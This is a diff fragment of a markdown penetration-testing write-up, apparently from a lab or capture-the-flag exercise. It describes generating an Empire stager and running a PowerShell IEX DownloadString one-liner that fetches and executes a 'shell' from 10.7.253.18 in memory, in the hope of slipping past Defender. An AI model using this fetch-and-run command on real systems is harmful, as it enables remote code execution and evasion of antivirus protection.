@@ -53,16 +53,18 @@ It should say FullLanguage
 
 ##### Shortcut
 
-Ok, so I discovered much later how to avoid having to do the two last steps. Just generate an Empire stager with `set Base64 false` and `set Outfile shell`
+Ok, so I discovered much later how to avoid having to do the two last steps. Just generate an Empire stager with `set Base64 false` and `set Outfile shell`  
 Now from the unrestricted powershell, download the shell and execute it straight into memory.
+
 ```
 IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.18/shell');
 ```
+
 If you are lucky, Defender doesn't pick it up and you get an Empire shell / agent.
 
-I realize after the fact that this is exactly the same steps as below, just fewer hoops.
+I realize after the fact that this is exactly the same steps as using msf below, just fewer hoops.
 
-#### 
+#### ![](/assets/shortcut.png)
 
 #### Getting meterpreter shell
 
